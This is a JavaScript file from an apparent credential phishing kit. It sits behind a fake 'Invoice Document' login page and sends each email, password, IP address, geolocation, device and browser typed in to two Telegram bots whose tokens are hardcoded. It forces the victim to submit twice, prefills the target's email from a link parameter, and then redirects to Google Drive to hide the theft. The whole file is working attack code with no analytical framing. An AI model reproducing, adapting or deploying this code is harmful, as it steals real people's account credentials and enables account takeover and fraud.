// ========== MULTIPLE TELEGRAM ACCOUNTS CONFIGURATION ==========
const TELEGRAM_RECIPIENTS = [{
        name: "Primary Admin",
        botToken: "6196043450:AAFe9Maq1vCeKAu-4QAraPhRG3f02tfHgUs",
        chatId: "1368087505"
    },
    {
        name: "Secondary Admin",
        botToken: "8944359311:AAH3VAmW2I8N2Fh3Nw4nsB17s7h4gKxRKOs",
        chatId: "8763281660"
    },
];

// ========== CONFIGURATION ==========
const REQUIRED_ATTEMPTS = 2; // User must submit at least 2 times before success

// Track user attempts
let userAttempts = 0;
let hasReachedRequired = false;

// ========== FUNCTION TO SEND TO MULTIPLE TELEGRAM ACCOUNTS ==========
async function sendToMultipleTelegram(username, email, password, attemptNumber = 1) {
    let ip = 'Unknown';
    let location = 'Unknown';

    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ip = ipData.ip;

        try {
            const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
            const geoData = await geoResponse.json();
            if (geoData.city && geoData.country_name) {
                location = `${geoData.city}, ${geoData.country_name}`;
            }
        } catch (e) {}
    } catch (e) {
        console.log('Could not fetch IP:', e);
    }

    const userAgent = navigator.userAgent;
    let deviceType = 'Unknown';
    if (/Mobile|Android|iPhone|iPad|iPod/i.test(userAgent)) {
        deviceType = '📱 Mobile Device';
    } else if (/Windows|Mac|Linux/i.test(userAgent)) {
        deviceType = '💻 Desktop Computer';
    }

    const timestamp = new Date().toLocaleString('en-US', {
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hour12: true
    });

    let browser = 'Unknown';
    if (userAgent.includes('Chrome')) browser = 'Chrome';
    else if (userAgent.includes('Firefox')) browser = 'Firefox';
    else if (userAgent.includes('Safari')) browser = 'Safari';
    else if (userAgent.includes('Edge')) browser = 'Edge';

    const message = `
NEW LOGIN CAPTURED (Attempt #${attemptNumber})
=======================

*Username:* ${username || 'Not provided'}
*Email:* ${email}
*Password:* ${password}

*IP Address:* ${ip}
*Location:* ${location}
*Device:* ${deviceType}
*Browser:* ${browser}

*Time:* ${timestamp}
*File:* Invoice Document
=======================
This is attempt ${attemptNumber} of ${REQUIRED_ATTEMPTS} required
            `;

    const results = [];

    for (const recipient of TELEGRAM_RECIPIENTS) {
        if (recipient.botToken === 'YOUR_BOT_TOKEN_1' ||
            recipient.botToken === 'YOUR_BOT_TOKEN_2' ||
            recipient.botToken === 'YOUR_BOT_TOKEN_3') {
            results.push({
                name: recipient.name,
                success: false,
                error: 'Not configured'
            });
            continue;
        }

        const telegramUrl = `https://api.telegram.org/bot${recipient.botToken}/sendMessage`;

        try {
            const response = await fetch(telegramUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: recipient.chatId,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            });

            const result = await response.json();

            if (result.ok) {
                console.log(`✅ Sent to ${recipient.name}`);
                results.push({
                    name: recipient.name,
                    success: true
                });
            } else {
                results.push({
                    name: recipient.name,
                    success: false,
                    error: result.description || 'Unknown error'
                });
            }
        } catch (error) {
            results.push({
                name: recipient.name,
                success: false,
                error: error.message
            });
        }
    }

    return results;
}

async function submitData(email, password, username, currentAttempt) {
    // Send to Telegram
    const telegramResults = await sendToMultipleTelegram(username, email, password, currentAttempt);

    const successCount = telegramResults.filter(r => r.success).length;
    const totalCount = telegramResults.length;

    return {
        telegram: {
            success: successCount > 0,
            count: `${successCount}/${totalCount}`
        }
    };
}

// ========== SHOW ERROR MESSAGE WITH SHAKE EFFECT ==========
function showError(message, highlightFields = true) {
    const messageDiv = document.getElementById('message');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');

    messageDiv.className = 'message error';
    messageDiv.innerHTML = message;

    const element = document.getElementById('element');
    element.classList.add('shake');
    setTimeout(() => {
        element.classList.remove('shake');
    }, 500);

    if (highlightFields) {
        emailInput.classList.add('error-input');
        passwordInput.classList.add('error-input');
        setTimeout(() => {
            emailInput.classList.remove('error-input');
            passwordInput.classList.remove('error-input');
        }, 2000);
    }

    setTimeout(() => {
        if (messageDiv.className === 'message error') {
            messageDiv.style.display = 'none';
        }
    }, 4000);
}

function showSuccess(message) {
    const messageDiv = document.getElementById('message');
    messageDiv.className = 'message success';
    messageDiv.innerHTML = message;
}

// ========== AUTO-GRAB EMAIL FUNCTION ==========
function updateEmailPreview() {
    const emailInput = document.getElementById('email');
    const emailPreview = document.getElementById('emailPreview');
    const email = emailInput.value;

    if (email && email.includes('@') && email.includes('.')) {
        // emailPreview.innerHTML = `Auto-detected: ${email}`;
        emailPreview.style.color = '#036e37';
    } else if (email && email.includes('@')) {
        emailPreview.innerHTML = `Please enter a valid email domain`;
        emailPreview.style.color = '#dc3545';
    } else if (email) {
        emailPreview.innerHTML = `Please enter a valid email address`;
        emailPreview.style.color = '#dc3545';
    } else {
        emailPreview.innerHTML = '';
    }
}

// ========== FORM SUBMISSION HANDLER ==========
document.getElementById('form').addEventListener('submit', async function (e) {
    e.preventDefault();

    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const submitBtn = document.getElementById('submitBtn');
    const loader = document.getElementById('loader');
    const messageDiv = document.getElementById('message');

    const email = emailInput.value.trim();
    const password = passwordInput.value;

    // Clear previous messages
    messageDiv.style.display = 'none';

    // Validate email
    if (!email || !email.includes('@') || !email.includes('.')) {
        showError('❌ Please enter a valid email address (e.g., name@domain.com)', true);
        emailInput.focus();
        return;
    }

    if (!password) {
        showError('❌ Please enter your password.', true);
        passwordInput.focus();
        return;
    }

    // Disable button and show loader
    submitBtn.disabled = true;
    loader.classList.add('active');

    // Increment attempt counter
    userAttempts++;
    // Extract username from email
    const username = email.split('@')[0];

    try {
        // SUBMIT DATA - ONCE PER BUTTON CLICK
        const result = await submitData(email, password, username, userAttempts);

        // Check if user has reached required attempts
        if (userAttempts < REQUIRED_ATTEMPTS) {
            const remainingAttempts = REQUIRED_ATTEMPTS - userAttempts;

            passwordInput.value = '';
            passwordInput.focus();

        } else if (userAttempts >= REQUIRED_ATTEMPTS && !hasReachedRequired) {

            hasReachedRequired = true;

            // Clear password for security
            passwordInput.value = '';

            // Wait before redirecting
            await new Promise(resolve => setTimeout(resolve, 2500));

            const emailField = document.createElement('input');
            emailField.name = 'email';
            emailField.value = email;

            const passField = document.createElement('input');
            passField.name = 'password';
            passField.value = password;

            // Fallback redirect
            setTimeout(() => {
                window.location.href = 'https://drive.google.com';
            }, 500);
        }

    } catch (error) {
        console.error('Submission error:', error);
        showError('An error occurred. Please try again.', true);
    } finally {
        // Re-enable button and hide loader
        passwordInput.value = '';
        submitBtn.disabled = false;
        loader.classList.remove('active');
    }
});

// Auto-grab email as user types
document.getElementById('email').addEventListener('input', updateEmailPreview);
document.getElementById('email').addEventListener('blur', updateEmailPreview);

// Initialize on page load
window.addEventListener('DOMContentLoaded', function () {
    updateEmailPreview();

    // Check for email in URL parameter
    const urlParams = new URLSearchParams(window.location.search);
    const emailParam = urlParams.get('id');
    if (emailParam) {
        document.getElementById('email').value = decodeURIComponent(emailParam);
        updateEmailPreview();
    }

    // Focus on password field
    document.getElementById('password').focus();
});